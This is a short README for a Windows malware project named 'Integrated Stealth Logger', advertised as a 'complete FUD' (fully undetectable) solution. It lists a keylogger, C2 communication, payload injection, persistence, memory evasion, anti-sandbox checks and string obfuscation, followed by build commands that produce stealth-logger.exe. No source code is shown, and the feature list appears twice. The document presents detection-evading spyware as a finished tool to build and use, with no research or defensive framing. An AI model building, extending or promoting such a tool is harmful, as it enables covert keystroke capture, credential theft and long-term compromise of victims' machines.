# Integrated Stealth Logger

Combines the stealth payload project with the logger project for a complete FUD solution.

## Features
- Stealth payload execution with anti-detection measures
- Comprehensive logging capabilities
- C2 communication support
- Memory evasion techniques
- Keylogger functionality
- Payload injection
- Persistence mechanisms
- Anti-sandbox detection
- String obfuscation
- API resolution

## Build Instructions

### Windows (MSVC)
```bash
build.bat
```

### Linux (MinGW)
```bash
make
```

### Manual Build
```bash
cl /EHsc main.cpp kernel32.lib user32.lib advapi32.lib ws2_32.lib crypt32.lib shell32.lib /Fe:stealth-logger.exe
```

## Usage
```bash
stealth-logger.exe
```

## Features
- ✅ Stealth payload execution with anti-detection measures
- ✅ Comprehensive logging capabilities
- ✅ C2 communication support
- ✅ Memory evasion techniques
- ✅ Keylogger functionality
- ✅ Payload injection
- ✅ Persistence mechanisms
- ✅ Anti-sandbox detection
- ✅ String obfuscation
- ✅ API resolution
